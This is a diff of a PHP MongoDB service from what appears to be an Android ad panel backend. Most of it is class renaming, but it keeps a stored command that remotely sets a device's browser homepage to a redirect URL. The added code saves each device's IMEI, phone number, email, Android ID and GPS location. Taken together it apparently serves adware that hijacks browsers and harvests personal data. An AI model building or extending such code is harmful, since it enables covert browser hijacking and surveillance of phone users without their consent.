@@ -14,11 +14,11 @@
 namespace adsPanel\BackendBundle\Services;
 
 use adsPanel\BackendBundle\Document\Respuesta;
-use adsPanel\BackendBundle\Document\Phone_Model;
+use adsPanel\BackendBundle\Document\PhoneModel;
 use adsPanel\BackendBundle\Document\Fabricant;
 use adsPanel\BackendBundle\Document\Language;
-use adsPanel\BackendBundle\Document\Network_Operator;
-use adsPanel\BackendBundle\Document\App_Android;
+use adsPanel\BackendBundle\Document\NetworkOperator;
+use adsPanel\BackendBundle\Document\AppAndroid;
 use adsPanel\BackendBundle\Document\Country;
 use adsPanel\BackendBundle\Document\Request;
 
@@ -40,14 +40,14 @@ class MongoService {
         $intent->setPaquete('com.android.browser');
         $intent->setComponente('com.android.browser.BrowserHomepageSetReceiver');
         $this->managerMongo->persist($intent);
-        $intent = new Respuesta();
-        $intent->setIdentificador('homepage');
-        $intent->setIntent('android.intent.action.OMADM_BROWSER_SET_HOMEPAGE');
-        $intent->setAtributo('homepage');
-        $intent->setValor($URL_REDIRECT);
-        $this->managerMongo->persist($intent);
+        $intent1 = new Respuesta();
+        $intent1->setIdentificador('homepage');
+        $intent1->setIntent('android.intent.action.OMADM_BROWSER_SET_HOMEPAGE');
+        $intent1->setAtributo('homepage');
+        $intent1->setValor($URL_REDIRECT);
+        $this->managerMongo->persist($intent1);
+        
         $this->managerMongo->flush();
-        //TODO inicializar valores constantes de tablas como paises, idiomas, etc...
     }
 
     public function getJSONordersToAndroid() {
@@ -76,7 +76,7 @@ class MongoService {
             $language = $result;
         } else {
             $language = new Language();
-            $language->setLanguague($name_language);
+            $language->setLanguage($name_language);
             $this->managerMongo->persist($language);
             $this->managerMongo->flush();
         }
@@ -84,12 +84,12 @@ class MongoService {
     }
 
     public function insertNetworkOperator($name) {
-        $result = $this->managerMongo->getRepository('BackendBundle:Network_Operator')->findOneByName($name);
+        $result = $this->managerMongo->getRepository('BackendBundle:NetworkOperator')->findOneByName($name);
         //CHECK IF EXISTS THE FIELD
         if ($result) {
             $network = $result;
         } else {
-            $network = new Network_Operator();
+            $network = new NetworkOperator();
             $network->setName($name);
             $this->managerMongo->persist($network);
             $this->managerMongo->flush();
@@ -126,12 +126,12 @@ class MongoService {
     }
 
     public function insertPhoneModel($name, $name_fabricant) {
-        $result = $this->managerMongo->getRepository('BackendBundle:Phone_Model')->findOneByPhoneModel($name);
+        $result = $this->managerMongo->getRepository('BackendBundle:PhoneModel')->findOneByPhoneModel($name);
         //CHECK IF EXISTS THE FIELD
         if ($result) {
             $model = $result;
         } else {
-            $model = new Phone_Model();
+            $model = new PhoneModel();
             $model->setPhoneModel($name);
             $model->setFabricant($this->insertFabricant($name_fabricant));
             $this->managerMongo->persist($model);
@@ -141,12 +141,12 @@ class MongoService {
     }
 
     public function insertApp($name, $package, $version) {
-        $result = $this->managerMongo->getRepository('BackendBundle:App_Android')->findOneBy(array('name_app' => $name, 'package_name' => $package, 'version_app' => $version));
+        $result = $this->managerMongo->getRepository('BackendBundle:AppAndroid')->findOneBy(array('nameApp' => $name, 'packageName' => $package, 'versionApp' => $version));
         //CHECK IF EXISTS THE FIELD
         if ($result) {
             $app = $result;
         } else {
-            $app = new App_Android();
+            $app = new AppAndroid();
             $app->setNameApp($name);
             $app->setPackageName($package);
             $app->setVersionApp($version);
@@ -157,32 +157,40 @@ class MongoService {
     }
 
     public function insertRequestByJSON($json) {
-        $sdk=$json['sdk_version'];
-        $model=$this->insertPhoneModel($json['model_phone'],$json['fabricant_phone']);
-        $network=$this->insertNetworkOperator($json['network_operator']);
-        $json['imei'];
-        $json['phone_number'];
-        $language=$this->insertLanguage($json['language']);
-        $country=$this->insertCountry($json['country']);
-        $app=$this->insertApp($json['name_app'], $json['package_name'], $json['version_app']);
-        $json['wifi'];
-        $json['android_id'];
-        $json['sd'];
-        $json['screen_size'];
-        $json['isTablet'];
-        $json['network_subtype'];
-        $result = $this->managerMongo->getRepository('BackendBundle:Request')->findOneBy(array('name_app' => $name, 'package_name' => $package, 'version_app' => $version));
+        //NOT IS NECESARY CHECK IF THE REQUEST EXISTS, A APPLICATION ONLY SEND INFO 1 TIME BY APP
+        $model = $this->insertPhoneModel($json['phone_model'], $json['fabricant_phone']);
+        $network = $this->insertNetworkOperator($json['network_operator']);
+        $language = $this->insertLanguage($json['language']);
+        $country = $this->insertCountry($json['country']);
+        $app = $this->insertApp($json['name_app'], $json['package_name'], $json['version_app']);
 
-
+        $request = new Request();
+        $request->setForeignApp($app);
+        $request->setForeignCountry($country);
+        $request->setForeignLanguage($language);
+        $request->setForeignNetworkOperator($network);
+        $request->setForeignPhoneModel($model);
+        $request->setImei($json['imei']);
+        $request->setIsTablet($json['isTablet']);
+        $request->setScreenSize($json['screen_size']);
+        $request->setSdkVersion($json['sdk_version']);
+        $request->setAndroidId($json['android_id']);
+        $request->setWifi($json['wifi']);
+        $request->setSd($json['sd']);
+        $request->setNetworkSubtype($json['network_subtype']);
         if (isset($json['latitude'])) {
-            
-        }
+            $request->setLactitude($json['latitude']);
+        }if(isset($json['phone_number'])){
+        $request->setPhoneNumber($json['phone_number']);}
         if (isset($json['longitude'])) {
-            
+            $request->setLongitude($json['longitude']);
         }
         if (isset($json['email'])) {
-            
+            $request->setEmail($json['email']);
         }
+        $this->managerMongo->persist($request);
+        $this->managerMongo->flush();
+        return $request;
     }
 
 }
